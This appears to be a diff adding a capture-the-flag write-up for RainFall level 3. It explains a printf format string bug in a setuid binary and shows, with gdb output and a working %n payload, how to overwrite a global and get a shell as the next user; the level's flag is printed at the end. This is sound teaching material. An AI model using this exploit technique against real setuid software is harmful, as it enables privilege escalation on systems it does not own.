@@ -1,6 +1,130 @@
+# Level 3
 
--> The goal is to overwrite m and assign it 0x40 (64)
--> Found vulnerability on printf function (format string exploit)
--> Create a payload to overwrite an address, in our case m == 0x40 (64) (.data section)
+## General Informations 
 
+**Path** : `/home/user/level3/level3` </br>
+**File** : 
+```
+level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3`
+
+## Static analysis
+
+After decompiling the binary with ghidra we get the pseudo code below: 
+
+```
+void v(void)
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+  if (m == 0x40) {
+    fwrite("Wait what?!\n",1,0xc,stdout);
+    system("/bin/sh");
+  }
+  return;
+}
+
+void main(void)
+{
+  v();
+  return;
+}
+```
+
+We have two functions in the binary:
+- `main`, which simply calls the v function.
+- `v`, where the main logic resides. It first uses the secure `fgets` function to read user input into a 520-byte buffer. This input is then printed using printf.
+
+There's also a conditional block that is only executed if the global variable `m` is equal to `0x40` (`m` is a symbol present in the ELF).
+This block is particularly interesting because it launches a shell by calling the `system("/bin/sh")` function.
+
+## Vulnerability found 
+
+The printf function is vulnerable to a format string exploit. </br>
+This vulnerability can be exploited to read or write arbitrary memory, and potentially execute malicious code. The issue arises from using unchecked user input directly as the format string parameter, which controls how the data is formatted and displayed. </br>
+[exploit-101-format-strings](https://axcheron.github.io/exploit-101-format-strings/)
+
+## Dynamic Analysis
+
+Our goal is to write a value to the symbol `m`.
+```
+> readelf -s level3
+...
+    66: 0804988c     4 OBJECT  GLOBAL DEFAULT   25 m
+...
+```
+The address of `m` is `0x0804988c`. 
+
+We will start by discoreving the position of our input in the stack.
+```
+(gdb) r <<< $(python -c 'print "A" * 4 + "%p " * 5')
+...
+AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025
+...
+``` 
+
+Because printf doesn't explicitly specify variables or addresses from the arguments — like in `printf("%p", my_var)` — the value of `my_var` will correspond to an address on the stack. This address is important because all operations will be based on its position. </br>
+
+We write an easily recognizable pattern, such as four `A`s, to help identify it in memory. Then, we display the data on the stack using the `%p` format specifier, which prints the pointer values at each address. </br>
+
+
+Our pattern is located at the fourth addresses. So `0x200` will be our base stack address. 
+```
+(gdb) x/16x $esp 
+0xbffff410:	0xbffff420	0x00000200	0xb7fd1ac0	0xb7ff37d0
+0xbffff420:	0x41414141	0x25207025	0x70252070	0x0a702520
+```
+
+By replacing our `AAAA` first bytes by an arbitrary address we should be able to read and write from it. 
+
+To write data inside an address we will use the specifier `%n` wich write the number of charchacters printed inside an address.
+
+```
+(gdb) r <<< $(python -c 'print "\x10\xf4\xff\xbf %4$n"')
+...
+Starting program: /home/user/level3/level3 <<< $(python -c 'print "\x10\xf4\xff\xbf %4$n"')
+��� 
+
+Breakpoint 1, 0x080484da in v ()
+(gdb) x/16x $esp 
+0xbffff410:	0x00000005	0x00000200	0xb7fd1ac0	0xb7ff37d0
+0xbffff420:	0xbffff410	0x24342520	0x00000a6e	0xb7fef305
+```
+
+In this example, we see that the stack address `0xbffff410` holds the value `5`. </br> 
+We wrote the stack address as `\x10\xf4\xff\xbf`, which consists of 4 characters, followed by a space character . This results in a total of 5 characters being written to the address specified by the first 4 bytes of our input. </br>
+We also used the parameter field `4$` to specify that the `%n` operation should apply to the 4th argument from where `printf` retrieves its parameters. </br>
+
+## Payload construction 
+ 
+1. The first 4 bytes correspond to the address of the symbol `m` (`0x0804988c`): </br>
+`python -c 'print "\x8c\x98\x04\x08"'` </br>
+2. Next is the number of character needed to display `0x40 -> 64 dec`: </br>
+`python -c 'print "\x8c\x98\x04\x08" + "A" * (64 - 4)'` </br>
+3. Then we write the specifier: </br>
+`python -c 'print "\x8c\x98\x04\x08" + "A" * (64 - 4) + "%4$n"'` </br>
+The parameter field `x$` indicates to use the `xth` addresses. The fourth one in our case. 
+4. Finally we add the `cat` command to catch the i/o of our shell and redirect it to the stdin of level3: </br>
+
+```
 (python -c 'print "\x8c\x98\x04\x08" + "A"*(64-4) + "%4$n"';cat) | ./level3
+```
+
+## Demonstration 
+
+```
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A"*(64-4) + "%4$n"';cat) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+```
+
+## Flag 
+
+```
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
